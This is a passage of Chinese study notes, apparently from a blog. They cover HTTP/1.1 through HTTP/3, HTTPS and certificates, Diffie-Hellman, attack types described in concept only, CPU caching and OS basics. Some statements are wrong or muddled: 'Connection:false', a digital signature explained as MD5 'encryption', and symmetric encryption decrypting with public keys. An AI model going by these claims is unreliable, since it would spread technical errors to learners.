<p>如果客户端想关闭HTTP连接，可以在请求头中携带Connection:false来告知服务器关闭请求。</p>
<p><strong>管道化(pipelining)— 尴尬的假并行传输</strong></p>
<p>HTTP1.1支持请求管道化(pipelining)。</p>
<p>基于HTTP1.1的长连接，使得请求管线化成为可能。 管线化使得请求能够“并行”传输。</p>
<p>例如：</p>
<p>假如响应的主体是一个html页面，页面中包含了很多img，这个时候keep-alive就了很大作用。能够“并行”发送多个请求。(注意，这里的“并行”并不是真正意义上的并行传输)</p>
<p>需要注意的是：服务器必须按照客户端请求的先后顺序依次回送相应的结果，以保证客户端能够区分出每次请求的响应内容。</p>
<p>也就是说，HTTP管道化可以让我们把先进先出队列从客户端(请求队列)迁移到服务端(响应队列)</p>
<p><strong>如果，客户端同时发了两个请求分别获取html和css，假如说服务器的css资源先准备就绪，服务器也会先发送html，再发送css。 换句话来说，只有等到html响应的资源完全传输完毕后，css响应的资源才开始传输，不允许同时存在两个并行的响应。</strong></p>
<p>可见，HTTP1.1还是无法解决队头阻塞(head of line blocking)的问题。同时“管道化”技术存在各种各样的问题，所以很多浏览器要么根本不支持它，要么直接默认关闭，并且开启的条件很苛刻……而且好像实际也没有什么用处。</p>
<p><strong>真并行传输 — 浏览器优化策略</strong></p>
<p>HTTP1.1支持管道化，但是服务器也必须进行逐个响应的送回，这个是很大的一个缺陷。实际上，现阶段的浏览器厂商采取了另外一种做法，它允许我们打开多个TCP的会话，也就是说，上图我们看到的并行，其实是不同的TCP连接上的HTTP请求和相应。这才是真正的并行!</p>
<p><strong>缓存处理 — 强缓存、协商缓存，启发式缓存(新增)</strong></p>
<p>此外，HTTP1.1还加入了缓存处理(强缓存和协商缓存)，新的字段如cache-control，支持断点传输，以及增加了Host字段(使得一个服务器能够用来创建多个Web站点)</p>
<h3 id="HTTP-2-0"><a href="#HTTP-2-0" class="headerlink" title="HTTP 2.0"></a>HTTP 2.0</h3><p><strong>二进制分帧</strong></p>
<p>HTTP2.0通过在应用层和传输层之间增加一个二进制分层帧，突破了HTTP1.1的性能限制，改进传输性能。</p>
<p><strong>多路复用(链接共享)— 真并行传输</strong></p>
<ul>
<li>流(stream)：已建立连接上的双向字节流。</li>
<li>消息：与逻辑消息对应的完整的一系列数据帧。</li>
<li>帧(frame)：HTTP2.0通信的最小单位，每个帧包含头部，至少也会标识出当前所属的流(stream_id)</li>
</ul>
<p>所有HTTP2.0通信都在一个TCP链接上完成，这个链接可以承载任意流量的双向数据流。</p>
<p>每个数据流以消息的形式发送，而消息由一或多个帧组成。这些帧可以乱序发送，然后再根据每个帧头部的流标识符(Stream_id)重新封装。</p>
<p>多路复用(连接共享)可能会导致关键字被阻塞，HTTP2.0里每个数据流都可以设置优先级和依赖，优先级高的数据流会被服务器优先处理和返回客户端，数据流还可以依赖其他的子数据流。</p>
<p>可见，HTTP2.0实现了真正的并行传输，它能够在一个TCP上进行任意数量的HTTP请求。而这个强大的功能基于“二级制分帧”的特性。</p>
<p><strong>头部压缩</strong></p>
<p>在HTTP1.X中，头部元数据都是以纯文本的形式发送的，通常会给每个请求增加500-8000字节的负荷。</p>
<p>比如cookie，默认情况下，浏览器会在每次请求的时候，把cookie附在header上面发给服务器。</p>
<p>HTTP2.0使用encoder来减少需要传输的header大小，通讯双方各自cache一份header_files表，既避免重复header的传输，又减少了需要传输的大小。</p>
<p>高效的压缩算法可以很大的压缩header，减少发送包的数量从而降低延迟。</p>
<p><strong>服务器推送</strong></p>
<p>服务器除了最初请求的响应外，服务器还可以额外向客户端推送资源，而无需客户端明确的需求。</p>
<p><strong>HTTP3.0</strong></p>
<p>Google搞了一个基于UDP协议的QUIC协议，并且使用在了HTTP&#x2F;3上， HTTP&#x2F;3之前的名称为HTTP-over-QUIC。</p>
<p>早期Quic协议，存在IETF和Google两个版本，直到它被证实命名为HTTP3.0</p>
<p><strong>IETF的QUIC工作小组创造了QUIC传输协议。QUIC是一个使用UDP来替代TCP的协议。最初的时候，Google开始助力QUIC，其后QUIC更多地被叫做“HTTP&#x2F;2-encrypted-over-UDP “。</strong></p>
<p><strong>社区中的人们已经使用非正式名称如iQUIC和gQUIC来指代这些不同版本的协议，以将QUIC协议与IETF和Google分开(因为它们在细节上差异很大)。通过“iQUIC”发送HTTP的协议被称为“HQ”(HTTP-over-QUIC)很长一段时间。</strong></p>
<p><strong>2018年11月7日，Litespeed的Dmitri宣布他们和Facebook已经成功地完成了两个HTTP&#x2F;3实现之间的第一次互操作。Mike Bihop在该主题的HTTPBIS会话中的后续介绍可以在这里看到。会议结束时达成共识称新名称是HTTP&#x2F;3!</strong></p>
<p><strong>0-RTT — QUIC协议相比HTTP2.0的最大优势</strong></p>
<p>缓存当前会话的上下文，下次恢复会话的时候，只需要将之前的缓存传递给服务器，验证通过，就可以进行传输了。</p>
<p>0-RTT建连可以说是QUIC相比HTTP2最大的性能优势。</p>
<p>什么是0-RTT建连?</p>
<ul>
<li>传输层0-RTT就能建立连接</li>
<li>加密层0-RTT就能建立加密连接</li>
</ul>
<p><strong>多路复用</strong></p>
<p>QUIC基于UDP，一个连接上的多个stream之间没有依赖，即使丢包，只需要重发丢失的包即可，不需要重传整个连接。</p>
<p><strong>更好的移动端表现</strong></p>
<p>QUIC在移动端的表现比TCP好，因为TCP是基于IP识别连接，而QUIC是通过ID识别链接。 无论网络环境如何变化，只要ID不便，就能迅速重新连上。</p>
<p><strong>加密认证的根文 — 武装到牙齿</strong></p>
<p>TCP协议头没有经过任何加密和认证，在传输过程中很容易被中间网络设备篡改、注入和窃听。</p>
<p>QUIC的packet可以说武装到了牙齿，除了个别报文，比如PUBLIC_RESET和CHLO，所有报文头部都是经过认证的，报文Body都是经过加密的。</p>
<p>所以只要对 QUIC 做任何更改，接收端都能及时发现，有效地降低了安全风险。</p>
<p><strong>向前纠错机制</strong></p>
<p>QUIC协议有一个非常独特的特性，称为向前纠错(Foward Error Connec，FEC)，每个数据包除了它本身的内容之外还包括了其他数据包的数据，因此少量的丢包可以通过其他包的冗余数据直接组装而无需重传。</p>
<p>向前纠错牺牲了每个数据包可以发送数据的上限，但是带来的提升大于丢包导致的数据重传，因为数据重传将会消耗更多的时间(包括确认数据包丢失，请求重传，等待新数据包等步骤的时间消耗)。</p>
<p>例如：</p>
<ul>
<li>我总共发送三个包，协议会算出这个三个包的异或值并单独发出一个校验包，也就是总共发出了四个包。</li>
<li>当其中出现了非校验包丢失的情况，可以通过另外三个包计算出丢失的数据包的内容。</li>
<li>当然这种技术只能使用在丢失一个包的情况下，如果出现丢失多个包，就不能使用纠错机制了，只能使用重传的方式了。</li>
</ul>
<p>HTTP2.0使用了多路复用的技术，做到同一个连接并发处理多个请求，而且并发请求的数量比HTTP1.1大了好几个数量级。HTTP1.1也可以多建立几个TCP连接，来支持处理更多并发的请求，但是创建TCP连接本身也是有开销的。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848907.jpeg" alt="img"></p>
<p>​    HTTP1.1不支持header数据的压缩，HTTP2.0使用HPACK算法对header的数据进行压缩，这样数据体积小了，在网络上传输就会更快。</p>
<p> 为了改善延迟，HTTP2.0引入了server push，它允许服务端推送资源给浏览器，在浏览器明确地请求之前，免得客户端再次创建连接发送请求到服务器端获取。这样客户端可以直接从本地加载这些资源，不用再通过网络。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848920.jpeg" alt="img"></p>
<ol>
<li><strong>长连接</strong> : <strong>在HTTP&#x2F;1.0中，默认使用的是短连接</strong>，也就是说每次请求都要重新建立一次连接。HTTP 是基于TCP&#x2F;IP协议的,每一次建立或者断开连接都需要三次握手四次挥手的开销，如果每次请求都要这样的话，开销会比较大。因此最好能维持一个长连接，可以用个长连接来发多个请求。<strong>HTTP 1.1起，默认使用长连接</strong> ,默认开启Connection： keep-alive。 <strong>HTTP&#x2F;1.1的持续连接有非流水线方式和流水线方式</strong> 。流水线方式是客户在收到HTTP的响应报文之前就能接着发送新的请求报文。与之相对应的非流水线方式是客户在收到前一个响应后才能发送下一个请求。</li>
<li><strong>错误状态响应码</strong> :在HTTP1.1中新增了24个错误状态响应码，如409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除。</li>
<li><strong>缓存处理</strong> :在HTTP1.0中主要使用header里的If-Modified-Since,Expires来做为缓存判断的标准，HTTP1.1则引入了更多的缓存控制策略例如Entity tag，If-Unmodified-Since, If-Match, If-None-Match等更多可供选择的缓存头来控制缓存策略。</li>
<li><strong>带宽优化及网络连接的使用</strong> :HTTP1.0中，存在一些浪费带宽的现象，例如客户端只是需要某个对象的一部分，而服务器却将整个对象送过来了，并且不支持断点续传功能，HTTP1.1则在请求头引入了range头域，它允许只请求资源的某个部分，即返回码是206（Partial Content），这样就方便了开发者自由的选择以便于充分利用带宽和连接。</li>
</ol>
<p><strong>问题归纳</strong></p>
<p><strong>HTTP1.1的合并请求(如CSSsprites)是否适用于HTTP2.0</strong></p>
<p>没有必要。</p>
<p>在头部压缩技术中，客户端和服务器均会维护两份相同的静态字典和动态字典。</p>
<p>在静态字典中，包含了常见的头部名称与值的组合。静态字典在首次请求时可以使用。那么现在头部的字段就可以被简写成静态字典中相应字段的index。</p>
<p>而动态字典跟连接的上下文相关，每个HTTP&#x2F;2连接维护的动态字典不尽相同。动态字典可以在连接不停地进行更新。</p>
<p>也就是说，原本完整的HTTP报文头部的键值或字段，由于字典的存在，现在可以转换成索引index，在相应的端再进行查找还原，也就起到了压缩的作用。</p>
<p>所以，<strong>同一个链接上产生的请求和响应越多，动态字典累积得越全，头部压缩的效果也就越好，所以针对HTTP&#x2F;2网站，最佳实践是不要合并资源。</strong></p>
<p>另外，HTTP2.0多路复用，使得请求可以并行传输，而HTTP1.1合并请求的一个原因也是为了防止过多的HTTP请求带来的阻塞问题。而现在HTTP2.0已经能够并行传输了，所以合并请求也就没有必要了。</p>
<p><strong>为什么要有HTTP3.0：HTTP&#x2F;2底层TCP的局限带来的问题</strong></p>
<p>由于HTTP&#x2F;2使用了多路复用，一般来说，同一个域名下只需要使用一个TCP链接，但当这个连接中出现了丢包的情况，就会导致HTTP&#x2F;2的表现情况反倒不如HTTP&#x2F;2了。</p>
<p>原因是： 在出现丢包的额情况下，整个TCP都要开始等待重传，导致后面的所有数据都被阻塞。</p>
<p>但是对于HTTP&#x2F;1.1来说，可以开启多个TCP连接，出现这种情况只会影响其中一个连接，剩余的TCP链接还可以正常传输数据。</p>
<p>由于修改TCP协议是不可能完成的任务。</p>
<p><strong>如何在Chrome中启用 QUIC 协议</strong></p>
<p>MTF在资源服务器和内容分发节点都已经启用了 HTTP3.0 协议，根据 用户浏览器 向下兼容，强烈建议您在Chrome浏览器开启实验性QUICK协议支持，体验加速效果：</p>
<p>在浏览器地址栏：输入chrome:&#x2F;&#x2F;flags</p>
<p>找到Experimental QUIC protocol，将Default改为Enabled</p>
<h2 id="URI和URL的区别是什么"><a href="#URI和URL的区别是什么" class="headerlink" title="URI和URL的区别是什么?"></a>URI和URL的区别是什么?</h2><ul>
<li>URI(Uniform Resource Identifier) 是统一资源标志符，可以唯一标识一个资源。</li>
<li>URL(Uniform Resource Location) 是统一资源定位符，可以提供该资源的路径。它是一种具体的 URI，即 URL 可以用来标识一个资源，而且还指明了如何 locate 这个资源。</li>
</ul>
<p>URI的作用像身份证号一样，URL的作用更像家庭住址一样。URL是一种具体的URI，它不仅唯一标识资源，而且还提供了定位该资源的信息。</p>
<h2 id="HTTP-和-HTTPS-的区别？"><a href="#HTTP-和-HTTPS-的区别？" class="headerlink" title="HTTP 和 HTTPS 的区别？"></a>HTTP 和 HTTPS 的区别？</h2><ol>
<li><p><strong>端口</strong> ：HTTP的URL由“http:&#x2F;&#x2F;”起始且默认使用端口80，而HTTPS的URL由“https:&#x2F;&#x2F;”起始且默认使用端口443。</p>
</li>
<li><p>安全性和资源消耗：</p>
<p>HTTP协议运行在TCP之上，所有传输的内容都是明文，客户端和服务器端都无法验证对方的身份。HTTPS是运行在SSL&#x2F;TLS之上的HTTP协议，SSL&#x2F;TLS 运行在TCP之上。所有传输的内容都经过加密，加密采用对称加密，但对称加密的密钥用服务器方的证书进行了非对称加密。所以说，HTTP 安全性没有 HTTPS高，但是 HTTPS 比HTTP耗费更多服务器资源。</p>
</li>
</ol>
<h2 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h2><h2 id="证书签发流程"><a href="#证书签发流程" class="headerlink" title="证书签发流程"></a>证书签发流程</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848929.jpg" alt="preview"></p>
<p>CA把证书给浏览器开发商，证书中包括CA的公钥和一些其它信息，用户下载浏览器里面就有很多CA证书。各大网站将自己的证书交个CA，CA核查其身份合法后用自己的私钥给网站证书签名。用户使用浏览器链接到网站。在加密链接建立之前，网站首先将自己的经过CA签名的证书发送给浏览器，浏览器首先根据该证书的信息，如那个CA对它进行了签名，结合浏览器自带的CA的证书，对该签名证书进行验证，如果验证通过，那么可以确定这个网站是真的网站。验证通过后，浏览器开始和网站建立安全通信。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211904472.jpg" alt="img"></p>
<h3 id="HTTPS的优点和缺点"><a href="#HTTPS的优点和缺点" class="headerlink" title="HTTPS的优点和缺点"></a>HTTPS的优点和缺点</h3><p>用HTTPS协议会使页面的加载时间延长近50%，增加10%到20%的耗电，此外，HTTPS协议还会影响缓存，增加数据开销和功耗，甚至已有安全措施也会受到影响也会因此而受到影响; 证书很贵;</p>
<p>而且HTTPS协议的加密范围也比较有限，在黑客攻击、拒绝服务攻击、服务器劫持等方面几乎起不到什么作用。</p>
<p>最关键的，SSL证书的信用链体系并不安全，特别是在某些国家可以控制CA根证书的情况下，中间人攻击一样可行。或者用户主动忽视浏览器提醒去访问, https也没有用;</p>
<p>https不一定安全</p>
<p>需要安装正版操作系统；安装正版浏览器，下载浏览器验证md5，hash，sum；安装杀毒软件；不要安装第三方证书；第三方机构不受信的话浏览器会打一个叉，但是用户可以执意去访问；</p>
<p>如果只用非对称加密，性能不好，用私钥加密的公钥能解开，服务器发的数据中间人能看到，而且加密耗时较长；</p>
<p>最简单的证书包含一个公开密钥、名称以及证书授权中心的数字签名</p>
<p>使用重定向方式让用户发送一个请求， 用户请求，<a href="http://www.baidu.com然后重定向到https//www.baidu.com%EF%BC%8C%E8%BF%99%E4%B8%AA%E6%97%B6%E5%80%99%E5%A6%82%E6%9E%9C%E5%9C%A8%E8%AE%BF%E9%97%AEwww.baidu.com%E8%BF%99%E6%AD%A5%E6%8B%A6%E6%88%AA%E4%BA%86%E7%9A%84%E8%AF%9D%E8%BF%98%E6%98%AF%E4%BC%9A%E6%9C%89%E9%97%AE%E9%A2%98%EF%BC%8C">www.baidu.com然后重定向到https://www.baidu.com，这个时候如果在访问www.baidu.com这步拦截了的话还是会有问题，</a> 可以重定向到另一个伪造的百度网站<a href="https://www.baldu.com,这个中间人可以申请到证书./">https://www.baldu.com，这个中间人可以申请到证书。</a></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848950.png" alt="image-20210601132322394"></p>
<p>如果return 307浏览器会做安全检查（302没有限制）就只能跳转到<a href="https://baidu.com,但是可以不让你return,直接拦截请求;/">https://baidu.com，但是可以不让你return，直接拦截请求；</a></p>
<p>浏览器可以再加几层来验证，例如电脑云管家验证， 中网可信网站验证， 知道创宇（安全联盟）验证；</p>
<p>人机交互：例如短信验证码，或者图形验证码，人脸识别，u盾</p>
<h2 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h2><p>常见攻击方式:</p>
<ul>
<li>udp炸弹</li>
<li>dos攻击</li>
<li>ddos攻击 : 利用很多台电脑去给服务器发数据包，没有其他办法解决，利用扫描工具扫描出肉机，利用肉机给服务器发数据包，使得正常用户无法访问该服务器</li>
<li>恶意程序<ul>
<li>计算机病毒: 会传染其他程序的程序,传染是通过修改其他程序来把自身或者其变种复制进去</li>
<li>计算机蠕虫: 通过网络的通信功能将自身从一个结点发送到另外一个结点并启动运行的程序</li>
<li>特洛伊木马: 一种程序,它执行的功能超过所声称的功能</li>
<li>逻辑炸弹: 一种当运行环境满足某种特定条件时执行其他特殊功能的程序</li>
</ul>
</li>
</ul>
<h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h3><p>DH算法并没有对双方身份进行验证。当Alice和Bob希望进行通信时，Eve可以很容易地向Alice冒充自己是Bob，以及向Bob冒充自己是Alice，然后分别和Alice和Bob建立公共的对称密钥。然后，Alice到Bob的通信都会通过Eve先使用自己与Alice建立的密钥先解密，获得明文信息之后，再用Eve与Bob建立的密钥加密，传给Bob。Bob到Alice的通信亦然。这样，Alice和Bob会以为自己和对方的通信是加密的，从而是安全的，但是它们的通信会经过Eve加解密一遍。Eve在Alice和Bob之间，拦截他们的通信，并且维持通信，就称为中间人攻击。</p>
<h2 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h2><p>效率高,密钥不适合在网上传输, 密钥维护麻烦</p>
<h3 id="DES-Data-Encyption-Standard"><a href="#DES-Data-Encyption-Standard" class="headerlink" title="DES(Data Encyption Standard)"></a>DES(Data Encyption Standard)</h3><p>它的保密性取决于密钥的保密, 算法是公开的. des是世界上第一个公认的实用密码算法标准,它曾对密码学的发展做出了重大贡献. 56位密钥破解需要3.5或21分钟, 128位密钥破解需要5.4*10 18次方光年.</p>
<h2 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h2><p>使用密钥对,公钥加密私钥解密,私钥加密公钥解密. </p>
<p>由于加密比较慢,可以先用对称加密加密文件,然后用公钥加密密钥,然后对方使用私钥解密密钥,然后用密码解密文件.</p>
<h3 id="DH算法"><a href="#DH算法" class="headerlink" title="DH算法"></a>DH算法</h3><ol>
<li><p>Alice和Bob通过交流,决定选择素数$p&#x3D;23$以及原根$g&#x3D;5$</p>
</li>
<li><p>Alice选择一个秘密整数$a&#x3D;4$,Bob选择一个秘密整数$b&#x3D;3$</p>
</li>
<li><p>Alice和Bob分别使用$p,g,a$和$b$计算出$A$和$B$</p>
<blockquote>
<p>$$<br>A&#x3D;g^amod(p)&#x3D;5^4mod(23)&#x3D;4<br>\<br>B&#x3D;g^bmod(p)&#x3D;5^3mod(23)&#x3D;10<br>$$</p>
</blockquote>
</li>
<li><p>Alice和Bob分别将这两个数字$A&#x3D;4$和$B&#x3D;10$通过网络发送给对方。</p>
</li>
<li><p>Alice和Bob收到$B$和$A$之后，分别计算：</p>
<blockquote>
<p>$$<br>s&#x3D;B^amod(p)&#x3D;10^4mod(23)&#x3D;18\<br>s&#x3D;A^bmod(p)&#x3D;4^3mod(23)&#x3D;18<br>$$</p>
</blockquote>
</li>
<li><p>现在Alice和Bob拥有了一个共同的密钥18。而且这个密钥从来没有在网络上传输过</p>
</li>
</ol>
<p>为什么Alice和Bob可以获得共同的公钥呢?</p>
<p>$A^bmod(p)&#x3D;(g^a)^bmod(p)&#x3D;(g^b)^amod(p)&#x3D;B^amod(p)$</p>
<p>那现在看一下，DH算法可以运行的关键是什么？</p>
<p>即使攻击者Eve可以获得23、5、$A$和$B$，她仍然不能得到Alice和Bob的秘密数字4和3。也即，即使知道 $5^3mod(23)&#x3D;10$这个计算过程中的底数5，模数23和结果10，她依然不能得到指数3。这个就是DH算法所依赖的计算离散对数的难度。（证明计算离散对数很难超纲）</p>
<h4 id="原根"><a href="#原根" class="headerlink" title="原根"></a>原根</h4><p>如果a是素数<em>p</em>的一个原根，那么数值：</p>
<p><em>a</em>mod<em>p</em>，<em>a^2</em> mod<em>p</em>，…，<em>a^(p-1)</em> mod<em>p</em></p>
<p>是各不相同的整数，且以某种排列方式组成了从<em>1</em>到<em>p-1</em>的所有整数。</p>
<h3 id="什么是数字签名"><a href="#什么是数字签名" class="headerlink" title="什么是数字签名?"></a>什么是数字签名?</h3><p>为了避免数据在传输过程中被替换，比如黑客修改了你的报文内容，但是你并不知道，所以我们让发送端做一个数字签名，把数据的摘要消息进行一个加密，比如 MD5，得到一个签名，和数据一起发送。然后接收端把数据摘要进行 MD5 加密，如果和签名一样，则说明数据确实是真的。</p>
<h3 id="什么是数字证书？"><a href="#什么是数字证书？" class="headerlink" title="什么是数字证书？"></a>什么是数字证书？</h3><p>对称加密中，双方使用公钥进行解密。虽然数字签名可以保证数据不被替换，但是数据是由公钥加密的，如果公钥也被替换，则仍然可以伪造数据，因为用户不知道对方提供的公钥其实是假的。所以为了保证发送方的公钥是真的，CA 证书机构会负责颁发一个证书，里面的公钥保证是真的，用户请求服务器时，服务器将证书发给用户，这个证书是经由系统内置证书的备案的。</p>
<h3 id="获取数字证书"><a href="#获取数字证书" class="headerlink" title="获取数字证书"></a>获取数字证书</h3><p>将自己的公钥以及信息发给CA审核,CA审核后用自己的私钥对这些信息进行加密,得到签名,将公钥,个人信息以及签名放在一起形成数字证书发给申请者. </p>
<h4 id="实际案例"><a href="#实际案例" class="headerlink" title="实际案例"></a>实际案例</h4><ul>
<li>A公司向B公司发邮件(内容不保密,但是必须的确定是A公司发的), 将邮件用单向散列函数算出128位摘要,然后用A的私钥对摘要加密得到数字签名,然后将邮件,数字签名以及数字证书发给公司B,公司B先用CA的公钥验证证书是否是CA所颁发(然后还得去ca上查改数字证书是否属于挂失状态),通过后,然后用同样的单向散列函数算出128位摘要,然后用A的数字证书里面的A的公钥对数字签名进行解密,看结果是否相同,结果相同的话就可以保证这份邮件由A发出,且没有被修改过 </li>
<li>党中央向地方政府发一封邮件, 内容不保密,但是不能别篡改,也是使用这种数字签名的方式.</li>
<li>A用户和B网站通信</li>
<li>A公司向B公司发一份邮件,内容保密,并且还得确定是A公司发的 ,B公司将B的公钥发给A,A公司用这个公钥对邮件加密(内容保密). 对加密后的内容计算摘要,用A的私钥加密形成数字签名,发给B,B先用CA的公钥验证证书,然后用计算摘要,用A的公钥解密签名,比对是否相同,然后用自己的私钥解开邮件.</li>
</ul>
<h1 id="计算机组成原理"><a href="#计算机组成原理" class="headerlink" title="计算机组成原理"></a>计算机组成原理</h1><p>多核cpu性能好, 但是成本高; 多cpu成本小,便宜,但是性能相对较差;</p>
<p>超线程, 一个核里面有两组寄存器,pc,但只有一个ALU,两个线程切换不需要保存现场,速度很快; 4核8线程是指有4个核,每个核有两组寄存器和pc;</p>
<p>一个cacheline 64字节, 从内存一次中一次读一个cacheline, 先读到L3cache, 然后L2cache, 然后L1cache;</p>
<p>图中一个cpu里面两个核, 一般L3Cache1只在一个cpu里面;</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848138.png" alt="image-20210423105857316"></p>
<p>假设对x和y使用了volatile,那么缓存需要一致,保持可见性,使用缓存一致性协议</p>
<p>线程1只用x, 而线程2只用y,使用有缓存一致性协议,x改了,线程二也得重新读缓存行,其实没有必要,它只用y, 可以缓存行对齐的方式解决, 浪费几个空间,x后面用无用数据占满;</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848127.png" alt="image-20210423110113455"></p>
<p>MSI MESI(intel) MOSI Synapse Firefly Dragon 都是缓存一致性协议,只是用在不同的cpu上</p>
<p>硬件上使用缓存锁;</p>
<p>如果其中一个缓存行改了,它会写回主存,它还会通过总线,告诉另一个缓存行你这个是invaild,然后这个缓存行回去缓存中读过; </p>
<p>MESI, 总线锁是volatile的具体实现;</p>
<p>volatile在jvm级别是通过内存屏障来防止乱序执行;到c++这个级别是通过lock执行来保证;</p>
<h4 id="DCL-double-checked-locking-单例模式需要加volatile吗"><a href="#DCL-double-checked-locking-单例模式需要加volatile吗" class="headerlink" title="DCL (double-checked locking)单例模式需要加volatile吗"></a>DCL (double-checked locking)单例模式需要加volatile吗</h4><p>对象创建分为3步, 分配内存(此时的变量都只有默认值),初始化,然后引用指向这块内存</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848148.png" alt="image-20210423114558613"></p>
<p>假设第一个线程初始化的时候发生指令重拍,指向了半初始化对象, 此时还没有执行构造方法; </p>
<p>然后第二个线程来了, 先判断t是否为空, 不空就直接用,使用了半初始化的对象,运行一百万次都难得出现一次,没有并发一定不会出现.</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848159.png" alt="image-20210423114754951"></p>
<p>cpu指令重排: 假设指令一去读数据了,然后指令二不依赖于指令一,cpu就会接着执行指令二</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848295.png" alt="image-20210423111942569"></p>
<p>wcbuffer (write combining)合并写buffer, 就4个字节,</p>
<p>为了提高效率,cpu在写入L1时,同时用wc写入L2, 由于ALU速度太快,所以在写入L1的同时,写入一份WCBuffer , 满了之后, 再直接更新到L2</p>
<h4 id="cpu层面如何禁止重排序"><a href="#cpu层面如何禁止重排序" class="headerlink" title="cpu层面如何禁止重排序?"></a>cpu层面如何禁止重排序?</h4><p>内存屏障, 对某部分内存做操作时前后添加屏障, 屏障前后的操作不可以乱序执行</p>
<h4 id="禁止乱序"><a href="#禁止乱序" class="headerlink" title="禁止乱序"></a>禁止乱序</h4><p>cpu层面: Intel -》原语(mfence, lfence, sfence)或者锁总线</p>
<p>JVM层面: 8个happens-before原则, 4个内存屏障(ll, ls, sl, ss)</p>
<p>as if serial: 不管硬件什么执行顺序, 单线程执行的结果不变, 看上去像是serial</p>
<p>hotspot就使用了lock(汇编指令)指令来执行</p>
<h1 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h1><p>30天自制操作系统</p>
<p>Linux内核设计与实现</p>
<p>UMA ：Uniform memory access</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848308.png" alt="image-20210605203758287"></p>
<p>NUMA： Non Uniform Memory Access</p>
<p>分配内存会优先分配离该线程最近的内存</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848396.png" alt="image-20210605203834153"></p>
<h2 id="启动过程"><a href="#启动过程" class="headerlink" title="启动过程"></a>启动过程</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848739.png" alt="image-20210423163941164"></p>
<p>通电- bios（basic input output system） uefi 工作- 自检 - 到硬盘固定位置加载bootloader - 读取可配置信息- CMOS</p>
<p>bootloader的位置是写死了,不然bios找不到,bios是写死的,改不了</p>
<p> CMOS是用来记录配置信息(开机密码),主办有块电池给他供电,忘了密码可以把它的电池扣下来,密码就重置了.</p>
<h2 id="操作系统基础"><a href="#操作系统基础" class="headerlink" title="操作系统基础"></a>操作系统基础</h2><h3 id="什么是操作系统？"><a href="#什么是操作系统？" class="headerlink" title="什么是操作系统？"></a>什么是操作系统？</h3><p>👨‍💻<strong>面试官</strong> ： 先来个简单问题吧！<strong>什么是操作系统？</strong></p>
<p>🙋 <strong>我</strong> ：我通过以下四点向您介绍一下什么是操作系统吧！</p>
<ol>
<li><strong>操作系统（Operating System，简称 OS）是管理计算机硬件与软件资源的程序，是计算机的基石。</strong></li>
<li><strong>操作系统本质上是一个运行在计算机上的软件程序 ，用于管理计算机硬件和软件资源。</strong> 举例：运行在你电脑上的所有应用程序都通过操作系统来调用系统内存以及磁盘等等硬件。</li>
<li><strong>操作系统存在屏蔽了硬件层的复杂性。</strong> 操作系统就像是硬件使用的负责人，统筹着各种相关事项。</li>
<li><strong>操作系统的内核（Kernel）是操作系统的核心部分，它负责系统的内存管理，硬件设备的管理，文件系统的管理以及应用程序的管理</strong>。 内核是连接应用程序和硬件的桥梁，决定着系统的性能和稳定性。</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848722.png" alt="Kernel_Layout"></p>
<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>根据进程访问资源的特点，我们可以把进程在系统上的运行分为两个级别：</p>
<ol>
<li>用户态(user mode) : 用户态运行的进程可以直接读取用户程序的数据。</li>
<li>系统态(kernel mode):可以简单的理解系统态运行的进程或程序几乎可以访问计算机的任何资源，不受限制。</li>
</ol>
<p>说了用户态和系统态之后，那么什么是系统调用呢？</p>
<p>我们运行的程序基本都是运行在用户态，如果我们调用操作系统提供的系统态级别的子功能咋办呢？那就需要系统调用了！</p>
<p>也就是说在我们运行的用户程序中，凡是与系统态级别的资源有关的操作（如文件管理、进程控制、内存管理等)，都必须通过系统调用方式向操作系统提出服务请求，并由操作系统代为完成。</p>
<p>这些系统调用按功能大致可分为如下几类：</p>
<ul>
<li>设备管理。完成设备的请求或释放，以及设备启动等功能。</li>
<li>文件管理。完成文件的读、写、创建及删除等功能。</li>
<li>进程控制。完成进程的创建、撤销、阻塞及唤醒等功能。</li>
<li>进程通信。完成进程之间的消息传递或信号传递等功能。</li>
<li>内存管理。完成内存的分配、回收以及获取作业占用内存区大小及地址等功能。</li>
</ul>
<h2 id="进程和线程-1"><a href="#进程和线程-1" class="headerlink" title="进程和线程"></a>进程和线程</h2><h3 id="进程和线程的区别"><a href="#进程和线程的区别" class="headerlink" title="进程和线程的区别"></a>进程和线程的区别</h3><p>👨‍💻<strong>面试官</strong>: 好的！我明白了！那你再说一下： <strong>进程和线程的区别</strong>。</p>
<p>🙋 <strong>我：</strong> 好的！ 下图是 Java内存区域，我们从 JVM 的角度来说一下线程和进程之间的关系吧！</p>
<blockquote>
